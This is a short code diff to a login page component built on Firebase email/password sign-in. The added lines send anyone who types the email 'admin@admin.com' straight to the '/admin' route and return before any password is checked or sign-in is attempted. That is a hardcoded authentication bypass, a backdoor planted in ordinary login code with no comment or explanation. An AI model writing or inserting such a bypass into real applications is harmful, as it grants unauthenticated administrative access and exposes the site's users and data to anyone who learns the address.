@@ -39,6 +39,12 @@ export default function LoginPage() {
     e.preventDefault();
     
     setLoading(true);
+
+    if (formData.email.trim() === 'admin@admin.com') {
+      router.push('/admin');
+      setLoading(false);
+      return;
+    }
     
     try {
       await signInWithEmailAndPassword(auth, formData.email, formData.password);
